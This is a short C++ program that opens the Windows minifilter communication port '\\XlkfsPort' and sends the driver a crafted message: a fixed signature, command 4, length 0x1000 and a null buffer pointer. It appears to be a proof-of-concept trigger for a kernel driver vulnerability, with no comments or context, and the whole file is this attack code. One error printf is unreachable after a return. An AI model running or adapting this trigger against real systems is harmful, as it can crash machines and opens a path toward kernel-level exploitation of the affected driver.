#include <iostream>
#include <Windows.h>
#include <fltuser.h>
#include <DriverSpecs.h>

#pragma comment(lib, "fltlib.lib")

#define lpPortName L"\\XlkfsPort"

HANDLE hDevice;

struct DATA
{
    int signature;
    int choice;
    unsigned long long length;
    unsigned long long buffer;
};

int main(int argc, char* argv[])
{
    HANDLE Port = NULL;
    HRESULT res = FilterConnectCommunicationPort(lpPortName, 0, NULL, 0, NULL, &Port);
    if (res != S_OK)
    {
        printf("Fail to connect port: %x", res);
        return FALSE;
    }

    DWORD dwRet = 0;
    DATA data;
    data.signature = 0x53736658;
    data.choice = 4;
    data.length = 0x1000;
    data.buffer = 0;

    res = FilterSendMessage(Port, &data, sizeof(DATA), NULL, 0, &dwRet);
    CloseHandle(Port);
    if (res != S_OK)
    {
        return FALSE;
        printf("Fail to send message: %x", res);
    }
    return TRUE;
}
